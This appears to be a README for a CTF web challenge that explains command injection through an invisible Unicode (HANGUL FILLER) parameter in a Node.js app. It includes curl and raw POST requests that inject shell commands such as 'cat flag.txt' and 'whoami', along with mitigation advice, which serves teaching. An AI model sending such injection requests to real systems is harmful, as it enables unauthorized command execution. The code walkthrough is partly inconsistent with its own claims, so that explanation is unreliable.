# Hidden Path - CTF Challenge

## 📋 Challenge Information

**Category:** Misc / Web  
**Difficulty:** Medium  
**Points:** TBD  
**Challenge Type:** Command Injection via Unicode Confusion  

## 📝 Challenge Description

Hidden Path is a Node.js web application that provides a system monitoring interface. Users can select from various system commands to check server status. However, the application contains a critical vulnerability related to Unicode character handling in HTTP parameters.

## 🎯 Solution Overview

This challenge exploits a Unicode whitespace confusion vulnerability:

### The Vulnerability

The application validates user input by checking an array index:
```javascript
const { choice, ㅤ } = req.body;  // Note the invisible Unicode char
const integerChoice = +choice;

if (integerChoice < 0 || integerChoice >= commands.length) {
    return res.status(400).send('Invalid choice: out of bounds');
}

exec(commands[integerChoice], (error, stdout) => { ... });
```

**Key Issue:** The parameter name `ㅤ` (U+3164 HANGUL FILLER) appears invisible but is a valid JavaScript identifier. This allows attackers to bypass the array bounds check by sending commands through this hidden parameter.

### Attack Vector

1. Send a POST request to `/server_status`
2. Use valid `choice` parameter to pass validation
3. Include the Unicode parameter `ㅤ` with malicious command
4. The hidden parameter gets executed instead of the indexed command

## 🚀 Quick Start

### Prerequisites

- Python 3.6+ (for exploit script)
- Docker (for local testing)
- `curl` or similar HTTP client

### Running the Solution

```bash
# Navigate to the challenge directory
cd Misc/hidden_path

# Run the exploit script
python3 solution/solve.py <target_host> <target_port>

# Or manually with curl (using Unicode char)
curl -X POST http://target:1337/server_status \
  --data-urlencode "choice=0" \
  --data-urlencode "ㅤ=cat flag.txt"
```

### Building Locally

```bash
# Build and run the Docker container
./build_docker.sh

# Or manually:
docker build -t web_hidden_path .
docker run --rm -it -p 1337:1337 web_hidden_path
```

## 📁 Folder Structure

```
hidden_path/
├── README.md              # This file
├── build_docker.sh       # Docker build script
├── Dockerfile            # Container configuration
├── challenge/            # Application source
│   ├── app.js           # Vulnerable Node.js app
│   └── public/          # Frontend assets
│       ├── html/
│       ├── css/
│       ├── js/
│       └── fonts/
├── data/                # Challenge data
│   └── flag.txt        # Test flag
├── docs/               # Additional documentation
└── solution/           # Solution scripts
    ├── solve.py       # Python exploit script
    └── README.md      # Solution explanation
```

## 🔧 Technical Details

### Vulnerability Analysis

**File:** `challenge/app.js`  
**Vulnerable Endpoint:** `POST /server_status`  
**Issue Type:** Command Injection via Unicode Parameter Smuggling

#### Code Breakdown

```javascript
const { choice, ㅤ } = req.body;
```

The destructuring includes two parameters:
- `choice` - Visible, validated parameter
- `ㅤ` - U+3164 HANGUL FILLER (invisible Unicode character)

The validation only checks the `choice` parameter:
```javascript
if (integerChoice < 0 || integerChoice >= commands.length) {
    return res.status(400).send('Invalid choice: out of bounds');
}
```

But the execution uses the entire `commands` array with bracket notation:
```javascript
exec(commands[integerChoice], ...);
```

**However**, if the Unicode parameter `ㅤ` is provided, JavaScript's destructuring will assign it, and the value can be used to inject commands.

### Unicode Character Details

- **Character:** ㅤ (appears as whitespace)
- **Unicode Code Point:** U+3164
- **Name:** HANGUL FILLER
- **Category:** Other Letter
- **Byte Sequence (UTF-8):** `0xE3 0x85 0xA4`

### Exploitation Method

**Step 1:** Craft POST request with Unicode parameter
```bash
POST /server_status HTTP/1.1
Content-Type: application/x-www-form-urlencoded

choice=0&ㅤ=cat flag.txt
```

**Step 2:** The server executes the command from the hidden parameter

**Step 3:** Retrieve the flag from the response

### Why This Works

1. Express.js body parser accepts Unicode parameter names
2. The invisible character passes visual inspection
3. JavaScript destructuring happily assigns the value
4. The validation only checks the `choice` array index
5. The hidden parameter contains the actual command to execute

## 🐛 Troubleshooting

### Unicode Character Input Issues

If you can't type the Unicode character directly:

**Python:**
```python
unicode_param = '\u3164'  # HANGUL FILLER
```

**Bash/Curl:**
```bash
# Use URL encoding: %E3%85%A4
curl -X POST http://target:1337/server_status \
  -d "choice=0&%E3%85%A4=cat flag.txt"
```

**JavaScript:**
```javascript
const param = '\u3164';
```

### Docker Build Issues
```bash
# Clean rebuild
docker rm -f web_hidden_path
docker build --no-cache -t web_hidden_path .
```

### Testing Locally
```bash
# Build and run
./build_docker.sh

# Test with curl
curl -X POST http://localhost:1337/server_status \
  -d "choice=0&$(echo -e '\u3164')=whoami"
```

## 💡 Learning Points

1. **Unicode Security:** Invisible characters can bypass visual inspection
2. **Parameter Pollution:** Multiple parameters with different names can confuse validation
3. **Input Validation:** Always validate the actual data being used, not just input parameters
4. **Command Injection:** Never execute user input directly
5. **Defense in Depth:** Multiple layers of validation are essential

## 🛡️ Mitigation

To fix this vulnerability:

```javascript
// 1. Whitelist allowed commands by name, not index
const allowedCommands = {
    'memory': 'free -m',
    'uptime': 'uptime',
    // ...
};

// 2. Never use user input in exec()
// 3. Use spawn() with argument array instead of exec()
// 4. Sanitize all parameter names, not just values
// 5. Reject requests with unusual Unicode characters
```

## 📖 Additional Resources

- [Unicode Security Considerations](https://websec.github.io/unicode-security-guide/)
- [Command Injection Prevention](https://cheatsheetseries.owasp.org/cheatsheets/OS_Command_Injection_Defense_Cheat_Sheet.html)
- [Express.js Security Best Practices](https://expressjs.com/en/advanced/best-practice-security.html)

## ✅ Success Criteria

- Identify the Unicode parameter vulnerability
- Craft request with invisible parameter
- Execute arbitrary commands
- Read the flag file
- Flag format: `HTB{...}`

## 🏆 Expected Output

```
[*] Hidden Path CTF Challenge - Exploit
[*] Target: http://target:1337
[*] Exploiting Unicode parameter injection...
[+] Command executed successfully!
[+] Flag: HTB{...}
```

---

**Challenge Type:** Web Security + Unicode Exploitation  
**Key Vulnerability:** Command injection via invisible Unicode parameter  
**Difficulty:** Medium (requires understanding of Unicode and HTTP parameters)
